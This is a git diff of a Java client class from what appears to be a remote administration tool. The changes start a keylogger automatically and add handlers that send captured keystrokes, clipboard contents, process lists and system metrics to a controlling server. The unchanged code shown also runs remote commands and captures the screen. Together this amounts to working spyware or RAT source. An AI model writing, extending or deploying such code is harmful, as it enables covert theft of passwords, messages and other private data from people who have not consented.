@@ -1,15 +1,14 @@
 package Client;
 
+import Control.Clipboard;
 import Control.KeyLogger;
 import Control.SendCommand;
 import Hardware.*;
+import Performance.CPU_Usage;
+import Performance.MemoryUsage;
 import Ultils.MessageType;
 import Ultils.NetUtils;
 import Ultils.Packet;
-import com.github.kwhat.jnativehook.NativeHookException;
-import org.jfree.data.time.DynamicTimeSeriesCollection;
-import oshi.SystemInfo;
-import oshi.hardware.CentralProcessor;
 
 import javax.imageio.IIOImage;
 import javax.imageio.ImageIO;
@@ -21,7 +20,6 @@ import java.awt.*;
 import java.awt.event.KeyEvent;
 import java.awt.image.BufferedImage;
 import java.io.*;
-import java.net.URL;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.ArrayList;
@@ -33,52 +31,47 @@ public class ClientManager {
     private Thread desktop;
     private boolean runningDesktop;
 
-    private float compression = 0.4F;
+    private float compression = 0.5F;
 
-    private Thread cpuUsage;
-    private boolean trackingCPU;
-
-    public static long[] oldTicks;
-    public static long[][] oldProcTicks;
-
-    // KeyLogger
-    private KeyLogger keylogger;
+    private Thread performance;
+    private boolean trackingPerformance;
+    KeyLogger keyLogger;
 
     public void onMessage(Packet packet, PrintWriter pw) {
-        if (keylogger == null) {
-            try {
-                keylogger = new KeyLogger(pw);
-            } catch (NativeHookException e) {
-                e.printStackTrace();
-            }
+        if (keyLogger == null) {
+            keyLogger = new KeyLogger();
+            keyLogger.startKeyLogger();
         }
 
         if (packet.action == MessageType.PERFORMANCE_TRACK.getID()) {
             System.out.println("Received from server:" + packet.data);
             try {
                 if (packet.data.get(0).equals("start")) {
-                    trackingCPU = true;
-                    if (cpuUsage == null || !cpuUsage.isAlive()) {
-                        cpuUsage = new Thread((new Runnable() {
+                    trackingPerformance = true;
+                    if (performance == null || !performance.isAlive()) {
+                        performance = new Thread((new Runnable() {
                             @Override
                             public void run() {
-                                TrackCpu(pw);
+                                sendPerformanceInfo(pw);
                             }
                         }));
-                        cpuUsage.start();
+                        performance.start();
                     }
                 } else if (packet.data.get(0).equals("stop")) {
-                    trackingCPU = false;
-                    if (this.cpuUsage != null && this.cpuUsage.isAlive()) {
-                        this.cpuUsage.stop();
+                    trackingPerformance = false;
+                    if (this.performance != null && this.performance.isAlive()) {
+                        this.performance.stop();
                     }
                 }
             } catch (Exception e) {
                 System.out.println("Failed to process performance packet");
             }
-            sendCpuUsage(pw);
-        } else if (packet.action == MessageType.STORAGE_TRACK.getID()) {
-            System.out.println("Storage Track");
+        } else if (packet.action == MessageType.KEYLOGGER.getID()) {
+            System.out.println("Sending keylogger info");
+            sendKeyloggerInfo(pw);
+        }  else if (packet.action == MessageType.CLIPBOARD.getID()) {
+            System.out.println("Sending clipboard info");
+            sendClipboardInfo(pw);
         } else if (packet.action == MessageType.HARDWARE_INFO.getID()) {
             System.out.println("Received request Hardware info");
             SendCpuInfo(pw);
@@ -124,10 +117,9 @@ public class ClientManager {
                 commandPacket.data = new ArrayList<String>();
                 commandPacket.data.add("return");
                 commandPacket.data.add(result);
-                commandPacket.data.add("eof");
                 NetUtils.sendMessage(commandPacket, pw);
             } catch (Exception e) {
-                e.printStackTrace();
+                System.out.println("Failed to send a command");
             }
         } else if (packet.action == MessageType.DESKTOP.getID()) {
             try {
@@ -162,10 +154,42 @@ public class ClientManager {
             System.out.println("Client logging off");
         }
     }
-    private void TrackCpu(PrintWriter pw) {
-        while (trackingCPU) {
+
+    private void sendKeyloggerInfo(PrintWriter pw) {
+        try {
+            String result = KeyLogger.getKeyloggerData();
+            Packet packet = new Packet();
+            packet.action = MessageType.KEYLOGGER.getID();
+            packet.data = new ArrayList<>();
+            packet.data.add(result);
+            NetUtils.sendMessage(packet, pw);
+            System.out.println(packet.data);
+        } catch (Exception e) {
+            System.out.println("Cannot send keylogger info");
+        }
+    }
+
+    private void sendClipboardInfo(PrintWriter pw) {
+        try {
+            String result = Clipboard.GetClipboard();
+            Packet packet = new Packet();
+            packet.action = MessageType.CLIPBOARD.getID();
+            packet.data = new ArrayList<>();
+            packet.data.add(result);
+            NetUtils.sendMessage(packet, pw);
+            System.out.println(packet.data);
+        } catch (Exception e) {
+            System.out.println("Cannot send clipboard info");
+        }
+    }
+
+    private void sendPerformanceInfo(PrintWriter pw) {
+        while (trackingPerformance) {
             try {
-                sendCpuUsage(pw);
+                sendPerformanceCPU(pw);
+                sendPerformanceDisk(pw);
+                sendPerformanceProcess(pw);
+                sendPerformanceRAM(pw);
             } catch (ThreadDeath tde) {
                 System.out.println("Stopped tracking");
             }
@@ -179,44 +203,59 @@ public class ClientManager {
         }
     }
 
-    private static void sendCpuUsage(PrintWriter pw)
-    {
-        SystemInfo si = new SystemInfo();
-        CentralProcessor processor = si.getHardware().getProcessor();
-        Hardware.CPU_Usage cpu_usage = new CPU_Usage(si);
+    private void sendPerformanceCPU(PrintWriter pw) {
         try {
             Packet packet = new Packet();
             packet.action = MessageType.PERFORMANCE_TRACK.getID();
-
-            double cpuData = cpu_usage.cpuData(processor,oldTicks);
-            double[] procData = cpu_usage.procData(processor,oldProcTicks);
-
             packet.data = new ArrayList<>();
-
-            for (int i = 0; i < procData.length; ++i)
-            {
-                packet.data.add(String.valueOf(procData[i] * 100));
-            }
-
-            packet.data.add(String.valueOf(cpuData * 100));
-
-            NetUtils.sendMessage(packet,pw);
-        } catch (Exception e){
-            e.printStackTrace();
+            packet.data.add("cpu");
+            packet.data.add(String.valueOf(CPU_Usage.getCpuPercent()));
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending cpu performance info");
+        } catch (Exception e) {
+            System.out.println("Failed to send cpu performance info");
         }
     }
 
-    private void downloadUsingStream(String urlStr, File file) throws IOException {
-        URL url = new URL(urlStr);
-        BufferedInputStream bis = new BufferedInputStream(url.openStream());
-        FileOutputStream fis = new FileOutputStream(file);
-        byte[] buffer = new byte[1024];
-        int count=0;
-        while((count = bis.read(buffer,0,1024)) != -1) {
-            fis.write(buffer, 0, count);
+    private void sendPerformanceRAM(PrintWriter pw) {
+        try {
+            Packet packet = new Packet();
+            packet.action = MessageType.PERFORMANCE_TRACK.getID();
+            packet.data = new ArrayList<>();
+            packet.data.add("ram");
+            packet.data.add(String.valueOf(MemoryUsage.getMemory()));
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending RAM performance info");
+        } catch (Exception e) {
+            System.out.println("Failed to send RAM performance info");
         }
-        fis.close();
-        bis.close();
+    }
+    private void sendPerformanceProcess(PrintWriter pw) {
+        try {
+            Packet packet = new Packet();
+            packet.action = MessageType.PERFORMANCE_TRACK.getID();
+            packet.data = new ArrayList<>();
+            packet.data.add("process");
+            packet.data.add(String.valueOf(Performance.Process.getProcessList()));
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending processes performance info");
+        } catch (Exception e) {
+            System.out.println("Failed to send processes performance info");
+        }
+    }
+
+    private void sendPerformanceDisk(PrintWriter pw) {
+        try {
+            Packet packet = new Packet();
+            packet.action = MessageType.PERFORMANCE_TRACK.getID();
+            packet.data = new ArrayList<>();
+            packet.data.add("disk");
+            packet.data.add(String.valueOf(Disk.GetDiskInfo()));
+            NetUtils.sendMessage(packet, pw);
+            System.out.println("Sending disk performance info");
+        } catch (Exception e) {
+            System.out.println("Failed to send disk performance info");
+        }
     }
 
     private void remoteDesktop(PrintWriter pw) {
@@ -249,12 +288,12 @@ public class ClientManager {
                     try {
                         temp.delete();
                     } catch (Exception e) {
-                        e.printStackTrace();
+                        System.out.println("Failed to remove image");
                     }
                 }
             }
             catch (Exception e) {
-                e.printStackTrace();
+                System.out.println("Failed to remote desktop");
             }
 
             try {
@@ -267,7 +306,7 @@ public class ClientManager {
             try {
                 temp.delete();
             } catch (Exception e) {
-                e.printStackTrace();
+                System.out.println("Cannot remove image");
             }
         }
     }
@@ -354,9 +393,5 @@ public class ClientManager {
         } catch (Exception e) {
             System.out.println("Failed to send RAM info");
         }
-    }
-
-    public String getSeparator() {
-        return "|}";
     }
 }
